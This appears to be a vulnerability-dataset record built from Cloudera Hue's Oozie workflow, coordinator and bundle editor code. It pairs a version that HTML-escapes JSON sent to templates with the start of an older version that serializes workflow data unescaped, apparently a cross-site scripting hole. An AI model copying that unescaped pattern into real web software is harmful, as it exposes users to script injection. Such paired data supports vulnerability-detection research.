  data['workflow']['properties']['deployment_dir'] = old_wf.deployment_dir
  data['workflow']['properties']['parameters'] = json.loads(old_wf.parameters)
  data['workflow']['properties']['description'] = old_wf.description
  data['workflow']['properties']['sla'] = old_wf.sla
  data['workflow']['properties']['sla_enabled'] = old_wf.sla_enabled
      
  # Layout
  rows = data['layout'][0]['rows']
  
  def _create_layout(nodes, size=12):
    wf_rows = []
    
    for node in nodes:      
      if type(node) == list and len(node) == 1:
        node = node[0]
      if type(node) != list:
        if node.node_type != 'kill': # No kill widget displayed yet
          wf_rows.append({""widgets"":[{""size"":size, ""name"": node.name.title(), ""id"":  uuids[node.id], ""widgetType"": ""%s-widget"" % node.node_type, ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span%s"" % size, ""columns"":[]}]})
      else:
        if node[0].node_type == 'fork':
          wf_rows.append({""widgets"":[{""size"":size, ""name"": 'Fork', ""id"":  uuids[node[0].id], ""widgetType"": ""%s-widget"" % node[0].node_type, ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span%s"" % size, ""columns"":[]}]})  
          
          wf_rows.append({  
            ""id"": str(uuid.uuid4()),
            ""widgets"":[  

            ],
            ""columns"":[  
               {  
                  ""id"": str(uuid.uuid4()),
                  ""size"": (size / len(node[1])),
                  ""rows"": 
                     [{  
                        ""id"": str(uuid.uuid4()),
                        ""widgets"": c['widgets'],
                        ""columns"":[]
                      } 
                    for c in col] if type(col) == list else [{  
                        ""id"": str(uuid.uuid4()),
                        ""widgets"": col['widgets'],
                        ""columns"":[]
                      }
                   ] 
                  ,                  
                  ""klass"":""card card-home card-column span%s"" % (size / len(node[1]))
               }
               for col in _create_layout(node[1], size)
            ]
          })
          
          wf_rows.append({""widgets"":[{""size"":size, ""name"": 'Join', ""id"":  uuids[node[2].id], ""widgetType"": ""%s-widget"" % node[2].node_type, ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span%s"" % size, ""columns"":[]}]})
        else:
          wf_rows.append(_create_layout(node, size))
    
    return wf_rows
  
  wf_rows = _create_layout(old_nodes[1:-1])
    
  if wf_rows:
    data['layout'][0]['rows'] = [data['layout'][0]['rows'][0]] + wf_rows + [data['layout'][0]['rows'][-1]]


  # Content
  def _dig_nodes(nodes):
    for node in nodes:
      if type(node) != list:
        properties = {}
        if '%s-widget' % node.node_type in NODES and node.node_type != 'kill-widget':
          properties = dict(NODES['%s-widget' % node.node_type].get_fields())
        
        if node.node_type == 'pig-widget':
          properties['script_path'] = node.script_path
          properties['params'] = json.loads(node.params)
          properties['files'] = json.loads(node.files)
          properties['archives'] = json.loads(node.archives)
          properties['job_properties'] = json.loads(node.archives)          
          properties['prepares'] = json.loads(node.prepares)
          properties['job_xml'] = node.job_xml
          properties['description'] = node.description
          properties['sla'] = node.sla
          properties['sla_enabled'] = node.sla_enabled

        wf_nodes.append({
            ""id"": uuids[node.id],
            ""name"": '%s-%s' % (node.node_type.split('-')[0], uuids[node.id][:4]),
            ""type"": ""%s-widget"" % node.node_type,
            ""properties"": properties,
            ""children"":[{('to' if link.name in ('ok', 'start') else link.name): uuids[link.child.get_full_node().id]} for link in node.get_children_links()]
        })
      else:
        _dig_nodes(node)

  _dig_nodes(old_nodes)
  
  data['workflow']['nodes'] = wf_nodes

  return Workflow(data=json.dumps(data))



class Coordinator(Job):
  XML_FILE_NAME = 'coordinator.xml'
  PROPERTY_APP_PATH = 'oozie.coord.application.path'
  HUE_ID = 'hue-id-c'

  def __init__(self, data=None, json_data=None, document=None):
    self.document = document

    if document is not None:
      self._data = json.loads(document.data)
    elif json_data is not None:
      self._data = json.loads(json_data)
    elif data is not None:
      self._data = data
    else:
      self._data = {
          'id': None, 
          'uuid': None,
          'name': 'My Coordinator',
          'variables': [],
          'properties': {
              'deployment_dir': '',
              'schema_version': 'uri:oozie:coordinator:0.2',
              'frequency_number': 1,
              'frequency_unit': 'days',
              'cron_frequency': '0 0 * * *',
              'cron_advanced': False,
              'timezone': 'America/Los_Angeles',
              'start': datetime.today(),
              'end': datetime.today() + timedelta(days=3),
              'workflow': None,
              'timeout': None,
              'concurrency': None,
              'execution': None,
              'throttle': None,
              'job_xml': '',
              'sla_enabled': False,
              'sla_workflow_enabled': False,
              'credentials': [],
              'parameters': [{'name': 'oozie.use.system.libpath', 'value': True}],
              'properties': [], # Aka workflow parameters
              'sla': Workflow.SLA_DEFAULT
          }
      }

  @property
  def id(self):
    return self.document.id

  @property
  def uuid(self):
    return self.document.uuid

  def json_for_html(self):
    _data = self.data.copy()

    _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')
    _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')

    return json.dumps(_data, cls=JSONEncoderForHTML)
 
  @property
  def data(self):
    if type(self._data['properties']['start']) == unicode:
      self._data['properties']['start'] = parse(self._data['properties']['start'])
      
    if type(self._data['properties']['end']) == unicode:
      self._data['properties']['end'] = parse(self._data['properties']['end'])    

    if self.document is not None:
      self._data['id'] = self.document.id

    return self._data
  
  @property
  def name(self):
    return self.data['name']

  @property      
  def deployment_dir(self):
    if not self.data['properties'].get('deployment_dir'):
      self.data['properties']['deployment_dir'] = Job.get_workspace(user)    
    return self.data['properties']['deployment_dir']
  
  def find_parameters(self):
    params = set()

    if self.sla_enabled:
      for param in find_json_parameters(self.sla):
        params.add(param)

# get missed params from wf

#    for prop in self.workflow.get_parameters():
#      if not prop['name'] in index:
#        props.append(prop)
#        index.append(prop['name'])
#
#    # Remove DataInputs and DataOutputs
#    datainput_names = [_input.name for _input in self.datainput_set.all()]
#    dataoutput_names = [_output.name for _output in self.dataoutput_set.all()]
#    removable_names = datainput_names + dataoutput_names
#    props = filter(lambda prop: prop['name'] not in removable_names, props)

# get $params in wf properties
# [{'name': parameter['workflow_variable'], 'value': parameter['dataset_variable']} for parameter in self.data['variables'] if parameter['dataset_type'] == 'parameter']

    return dict([(param, '') for param in list(params)])
  
  @property      
  def sla_enabled(self):
    return self.data['properties']['sla_enabled']

  @property      
  def sla(self):
    return self.data['properties']['sla']
  
  @property      
  def parameters(self):
    return self.data['properties']['parameters']
  
  @property
  def datasets(self):
    return self.inputDatasets + self.outputDatasets
  
  @property
  def inputDatasets(self):    
    return [Dataset(dataset) for dataset in self.data['variables'] if dataset['dataset_type'] == 'input_path']
    
  @property
  def outputDatasets(self):
    return [Dataset(dataset) for dataset in self.data['variables'] if dataset['dataset_type'] == 'output_path']

  @property
  def start_utc(self):
    return utc_datetime_format(self.data['properties']['start'])

  @property
  def end_utc(self):
    return utc_datetime_format(self.data['properties']['end'])

  @property
  def frequency(self):
    return '${coord:%(unit)s(%(number)d)}' % {'unit': self.data['properties']['frequency_unit'], 'number': self.data['properties']['frequency_number']}

  @property
  def cron_frequency(self):
    data_dict = self.data['properties']
    
    if 'cron_frequency' in data_dict:
      return data_dict['cron_frequency']
    else:
      # Backward compatibility
      freq = '0 0 * * *'
      if data_dict['frequency_number'] == 1:
        if data_dict['frequency_number'] == 'MINUTES':
          freq = '* * * * *'
        elif data_dict['frequency_number'] == 'HOURS':
          freq = '0 * * * *'
        elif data_dict['frequency_number'] == 'DAYS':
          freq = '0 0 * * *'
        elif data_dict['frequency_number'] == 'MONTH':
          freq = '0 0 * * *'
      return {'frequency': freq, 'isAdvancedCron': False}

  def to_xml(self, mapping=None):
    if mapping is None:
      mapping = {}

    tmpl = ""editor/gen2/coordinator.xml.mako""
    return re.sub(re.compile('\s*\n+', re.MULTILINE), '\n', django_mako.render_to_string(tmpl, {'coord': self, 'mapping': mapping})).encode('utf-8', 'xmlcharrefreplace') 
  
  @property
  def properties(self):    
    props = [{'name': dataset['workflow_variable'], 'value': dataset['dataset_variable']} for dataset in self.data['variables'] if dataset['dataset_type'] == 'parameter']
    props += self.data['properties']['properties']
    return props


class Dataset():

  def __init__(self, data):
    self._data = data

  @property
  def data(self):
    if type(self._data['start']) == unicode: 
      self._data['start'] = parse(self._data['start'])

    self._data['name'] = self._data['workflow_variable']

    return self._data      
      
  @property
  def frequency(self):
    return '${coord:%(unit)s(%(number)d)}' % {'unit': self.data['frequency_unit'], 'number': self.data['frequency_number']}
      
  @property
  def start_utc(self):
    return utc_datetime_format(self.data['start'])

  @property
  def start_instance(self):
    if not self.is_advanced_start_instance:
      return int(self.data['advanced_start_instance'])
    else:
      return 0

  @property
  def is_advanced_start_instance(self):
    return not self.is_int(self.data['advanced_start_instance'])

  def is_int(self, text):
    try:
      int(text)
      return True
    except ValueError:
      return False

  @property
  def end_instance(self):
    if not self.is_advanced_end_instance:
      return int(self.data['advanced_end_instance'])
    else:
      return 0

  @property
  def is_advanced_end_instance(self):
    return not self.is_int(self.data['advanced_end_instance'])



class Bundle(Job):
  XML_FILE_NAME = 'bundle.xml'
  PROPERTY_APP_PATH = 'oozie.bundle.application.path'
  HUE_ID = 'hue-id-b'

  def __init__(self, data=None, json_data=None, document=None):
    self.document = document

    if document is not None:
      self._data = json.loads(document.data)
    elif json_data is not None:
      self._data = json.loads(json_data)
    elif data is not None:
      self._data = data
    else:
      self._data = {
          'id': None, 
          'uuid': None,
          'name': 'My Bundle',
          'coordinators': [],
          'properties': {
              'deployment_dir': '',
              'schema_version': 'uri:oozie:bundle:0.2',
              'kickoff': datetime.today(),
              'parameters': [{'name': 'oozie.use.system.libpath', 'value': True}]
          }
      }

  @property
  def id(self):
    return self.document.id

  @property
  def uuid(self):
    return self.document.uuid

  def json_for_html(self):
    _data = self.data.copy()

    _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')

    return json.dumps(_data, cls=JSONEncoderForHTML)
 
  @property
  def data(self):
    if type(self._data['properties']['kickoff']) == unicode:
      self._data['properties']['kickoff'] = parse(self._data['properties']['kickoff'])

    if self.document is not None:
      self._data['id'] = self.document.id

    return self._data
 
  def to_xml(self, mapping=None):
    if mapping is None:
      mapping = {}

    mapping.update(dict(list(Document2.objects.filter(type='oozie-coordinator2', uuid__in=self.data['coordinators']).values('uuid', 'name'))))
    tmpl = ""editor/gen2/bundle.xml.mako""
    return force_unicode(
              re.sub(re.compile('\s*\n+', re.MULTILINE), '\n', django_mako.render_to_string(tmpl, {
                'bundle': self,
                'mapping': mapping
           })))
  
  
  @property      
  def name(self):
    return self.data['name']
  
  @property      
  def parameters(self):
    return self.data['properties']['parameters']  
  
  @property
  def kick_off_time_utc(self):
    return utc_datetime_format(self.data['properties']['kickoff'])  
  
  @property      
  def deployment_dir(self):
    if not self.data['properties'].get('deployment_dir'):
      self.data['properties']['deployment_dir'] = Job.get_workspace(user)    
    return self.data['properties']['deployment_dir']
  
  def find_parameters(self):
    return {}
/n/n/napps/oozie/src/oozie/views/editor2.py/n/n#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging
import uuid

from django.core.urlresolvers import reverse
from django.forms.formsets import formset_factory
from django.http import HttpResponse
from django.shortcuts import redirect
from django.utils.translation import ugettext as _

from desktop.lib.django_util import render
from desktop.lib.exceptions_renderable import PopupException
from desktop.lib.i18n import smart_str
from desktop.lib.rest.http_client import RestException
from desktop.lib.json_utils import JSONEncoderForHTML
from desktop.models import Document, Document2

from liboozie.credentials import Credentials
from liboozie.oozie_api import get_oozie
from liboozie.submission2 import Submission

from oozie.decorators import check_document_access_permission, check_document_modify_permission
from oozie.forms import ParameterForm
from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\
    find_dollar_variables, find_dollar_braced_variables


LOG = logging.getLogger(__name__)



def list_editor_workflows(request):  
  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]

  return render('editor/list_editor_workflows.mako', request, {
      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)
  })


@check_document_access_permission()
def edit_workflow(request):
  workflow_id = request.GET.get('workflow')
  
  if workflow_id:
    wid = {}
    if workflow_id.isdigit():
      wid['id'] = workflow_id
    else:
      wid['uuid'] = workflow_id
    doc = Document2.objects.get(type='oozie-workflow2', **wid)
    workflow = Workflow(document=doc)
  else:
    doc = None
    workflow = Workflow()
    workflow.set_workspace(request.user)
    workflow.check_workspace(request.fs, request.user)
  
  workflow_data = workflow.get_data()

  api = get_oozie(request.user)
  credentials = Credentials()
  
  try:  
    credentials.fetch(api)
  except Exception, e:
    LOG.error(smart_str(e))

  return render('editor/workflow_editor.mako', request, {
      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),
      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),
      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),
      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),
      'doc1_id': doc.doc.get().id if doc else -1,
      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))
  })


def new_workflow(request):
  return edit_workflow(request)


def delete_workflow(request):
  if request.method != 'POST':
    raise PopupException(_('A POST request is required.'))

  jobs = json.loads(request.POST.get('selection'))

  for job in jobs:
    doc2 = Document2.objects.get(id=job['id'])
    doc = doc2.doc.get()
    doc.can_write_or_exception(request.user)
    
    doc.delete()
    doc2.delete()

  response = {}
  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))
  
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def copy_workflow(request):
  if request.method != 'POST':
    raise PopupException(_('A POST request is required.'))

  jobs = json.loads(request.POST.get('selection'))

  for job in jobs:
    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])
    
    name = doc2.name + '-copy'
    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)
  
    doc2.pk = None
    doc2.id = None
    doc2.uuid = str(uuid.uuid4())
    doc2.name = name
    doc2.owner = request.user    
    doc2.save()
  
    doc2.doc.all().delete()
    doc2.doc.add(copy_doc)
    
    workflow = Workflow(document=doc2)
    workflow.update_name(name)
    doc2.update_data({'workflow': workflow.get_data()['workflow']})
    doc2.save()

    workflow.set_workspace(request.user)
    workflow.check_workspace(request.fs, request.user)

  response = {}  
  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_modify_permission()
def save_workflow(request):
  response = {'status': -1}

  workflow = json.loads(request.POST.get('workflow', '{}'))
  layout = json.loads(request.POST.get('layout', '{}'))

  if workflow.get('id'):
    workflow_doc = Document2.objects.get(id=workflow['id'])
  else:      
    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)
    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')

  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']
  if subworkflows:
    dependencies = Document2.objects.filter(uuid__in=subworkflows)
    workflow_doc.dependencies = dependencies

  workflow_doc.update_data({'workflow': workflow})
  workflow_doc.update_data({'layout': layout})
  workflow_doc.name = workflow['name']
  workflow_doc.save()
  
  workflow_instance = Workflow(document=workflow_doc)
  
  response['status'] = 0
  response['id'] = workflow_doc.id
  response['doc1_id'] = workflow_doc.doc.get().id
  response['message'] = _('Page saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def new_node(request):
  response = {'status': -1}

  node = json.loads(request.POST.get('node', '{}'))

  properties = NODES[node['widgetType']].get_mandatory_fields()
  workflows = []

  if node['widgetType'] == 'subworkflow-widget':
    workflows = _get_workflows(request.user)

  response['status'] = 0
  response['properties'] = properties 
  response['workflows'] = workflows
  
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def _get_workflows(user):
  return [{
        'name': workflow.name,
        'owner': workflow.owner.username,
        'value': workflow.uuid,
        'id': workflow.id
      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]
    ]  


def add_node(request):
  response = {'status': -1}

  node = json.loads(request.POST.get('node', '{}'))
  properties = json.loads(request.POST.get('properties', '{}'))
  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))

  _properties = dict(NODES[node['widgetType']].get_fields())
  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))

  if copied_properties:
    _properties.update(copied_properties)

  response['status'] = 0
  response['properties'] = _properties
  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def action_parameters(request):
  response = {'status': -1}
  parameters = set()

  try:
    node_data = json.loads(request.POST.get('node', '{}'))
    
    parameters = parameters.union(set(Node(node_data).find_parameters()))
    
    script_path = node_data.get('properties', {}).get('script_path', {})
    if script_path:
      script_path = script_path.replace('hdfs://', '')

      if request.fs.do_as_user(request.user, request.fs.exists, script_path):
        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  

        if node_data['type'] in ('hive', 'hive2'):
          parameters = parameters.union(set(find_dollar_braced_variables(data)))
        elif node_data['type'] == 'pig':
          parameters = parameters.union(set(find_dollar_variables(data)))
                
    response['status'] = 0
    response['parameters'] = list(parameters)
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def workflow_parameters(request):
  response = {'status': -1}

  try:
    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) 

    response['status'] = 0
    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def gen_xml_workflow(request):
  response = {'status': -1}

  try:
    workflow_json = json.loads(request.POST.get('workflow', '{}'))
  
    workflow = Workflow(workflow=workflow_json)
  
    response['status'] = 0
    response['xml'] = workflow.to_xml()
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def submit_workflow(request, doc_id):
  workflow = Workflow(document=Document2.objects.get(id=doc_id))
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)    

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])

      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)

      request.info(_('Workflow submitted'))
      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = workflow.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

    popup = render('editor/submit_job_popup.mako', request, {
                     'params_form': params_form,
                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})
                   }, force_template=True).content
    return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_workflow(user, fs, jt, workflow, mapping):
  try:
    submission = Submission(user, workflow, fs, jt, mapping)
    job_id = submission.run()
    return job_id
  except RestException, ex:
    detail = ex._headers.get('oozie-error-message', ex)
    if 'Max retries exceeded with url' in str(detail):
      detail = '%s: %s' % (_('The Oozie server is not running'), detail)
    LOG.error(smart_str(detail))
    raise PopupException(_(""Error submitting workflow %s"") % (workflow,), detail=detail)

  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))



def list_editor_coordinators(request):
  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]

  return render('editor/list_editor_coordinators.mako', request, {
      'coordinators': coordinators
  })


@check_document_access_permission()
def edit_coordinator(request):
  coordinator_id = request.GET.get('coordinator')
  doc = None
  
  if coordinator_id:
    doc = Document2.objects.get(id=coordinator_id)
    coordinator = Coordinator(document=doc)
  else:
    coordinator = Coordinator()

  api = get_oozie(request.user)
  credentials = Credentials()
  
  try:  
    credentials.fetch(api)
  except Exception, e:
    LOG.error(smart_str(e))

  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])
                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]

  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):
    raise PopupException(_('You don\'t have access to the workflow of this coordinator.'))

  return render('editor/coordinator_editor.mako', request, {
      'coordinator_json': coordinator.json_for_html(),
      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),
      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),
      'doc1_id': doc.doc.get().id if doc else -1,
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))
  })


def new_coordinator(request):
  return edit_coordinator(request)


@check_document_modify_permission()
def save_coordinator(request):
  response = {'status': -1}

  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))

  if coordinator_data.get('id'):
    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])
  else:      
    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)
    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')

  if coordinator_data['properties']['workflow']:
    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])
    for doc in dependencies:
      doc.doc.get().can_read_or_exception(request.user)
    coordinator_doc.dependencies = dependencies

  coordinator_doc.update_data(coordinator_data)
  coordinator_doc.name = coordinator_data['name']
  coordinator_doc.save()
  
  response['status'] = 0
  response['id'] = coordinator_doc.id
  response['message'] = _('Saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def gen_xml_coordinator(request):
  response = {'status': -1}

  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))

  coordinator = Coordinator(data=coordinator_dict)

  response['status'] = 0
  response['xml'] = coordinator.to_xml()
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"") 


@check_document_access_permission()
def submit_coordinator(request, doc_id):
  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])
      job_id = _submit_coordinator(request, coordinator, mapping)

      request.info(_('Coordinator submitted.'))
      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = coordinator.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

  popup = render('editor/submit_job_popup.mako', request, {
                 'params_form': params_form,
                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})
                }, force_template=True).content
  return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_coordinator(request, coordinator, mapping):
  try:
    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])
    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()

    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}
    properties.update(mapping)

    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)
    job_id = submission.run()

    return job_id
  except RestException, ex:
    raise PopupException(_(""Error submitting coordinator %s"") % (coordinator,),
                         detail=ex._headers.get('oozie-error-message', ex))
    
    
    

def list_editor_bundles(request):
  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]

  return render('editor/list_editor_bundles.mako', request, {
      'bundles': bundles
  })


@check_document_access_permission()
def edit_bundle(request):
  bundle_id = request.GET.get('bundle')
  doc = None
  
  if bundle_id:
    doc = Document2.objects.get(id=bundle_id)
    bundle = Bundle(document=doc)
  else:
    bundle = Bundle()

  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])
                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]

  return render('editor/bundle_editor.mako', request, {
      'bundle_json': bundle.json_for_html(),
      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),
      'doc1_id': doc.doc.get().id if doc else -1,
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      
  })


def new_bundle(request):
  return edit_bundle(request)


@check_document_modify_permission()
def save_bundle(request):
  response = {'status': -1}

  bundle_data = json.loads(request.POST.get('bundle', '{}'))

  if bundle_data.get('id'):
    bundle_doc = Document2.objects.get(id=bundle_data['id'])
  else:      
    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)
    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')

  if bundle_data['coordinators']:
    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])
    for doc in dependencies:
      doc.doc.get().can_read_or_exception(request.user)    
    bundle_doc.dependencies = dependencies

  bundle_doc.update_data(bundle_data)
  bundle_doc.name = bundle_data['name']
  bundle_doc.save()
  
  response['status'] = 0
  response['id'] = bundle_doc.id
  response['message'] = _('Saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def submit_bundle(request, doc_id):
  bundle = Bundle(document=Document2.objects.get(id=doc_id))  
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])
      job_id = _submit_bundle(request, bundle, mapping)

      request.info(_('Bundle submitted.'))
      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = bundle.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

  popup = render('editor/submit_job_popup.mako', request, {
                 'params_form': params_form,
                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})
                }, force_template=True).content
  return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_bundle(request, bundle, properties):
  try:
    deployment_mapping = {}
    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])
    
    for i, bundled in enumerate(bundle.data['coordinators']):
      coord = coords[bundled['coordinator']]
      workflow = Workflow(document=coord.dependencies.all()[0])
      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      
      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)
      
      coordinator = Coordinator(document=coord)
      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()
      deployment_mapping['coord_%s_dir' % i] = coord_dir
      deployment_mapping['coord_%s' % i] = coord

    properties.update(deployment_mapping)
    
    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)
    job_id = submission.run()

    return job_id
  except RestException, ex:
    raise PopupException(_(""Error submitting bundle %s"") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))

/n/n/n",0
81,6641c62beaa1468082e47d82da5ed758d11c7735,"/apps/oozie/src/oozie/views/editor2.py/n/n#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging
import uuid

from django.core.urlresolvers import reverse
from django.forms.formsets import formset_factory
from django.http import HttpResponse
from django.shortcuts import redirect
from django.utils.translation import ugettext as _

from desktop.lib.django_util import render
from desktop.lib.exceptions_renderable import PopupException
from desktop.lib.i18n import smart_str
from desktop.lib.rest.http_client import RestException
from desktop.models import Document, Document2

from liboozie.credentials import Credentials
from liboozie.oozie_api import get_oozie
from liboozie.submission2 import Submission

from oozie.decorators import check_document_access_permission, check_document_modify_permission
from oozie.forms import ParameterForm
from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\
    find_dollar_variables, find_dollar_braced_variables


LOG = logging.getLogger(__name__)



def list_editor_workflows(request):  
  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]

  return render('editor/list_editor_workflows.mako', request, {
      'workflows_json': json.dumps(workflows)
  })


@check_document_access_permission()
def edit_workflow(request):
  workflow_id = request.GET.get('workflow')
  
  if workflow_id:
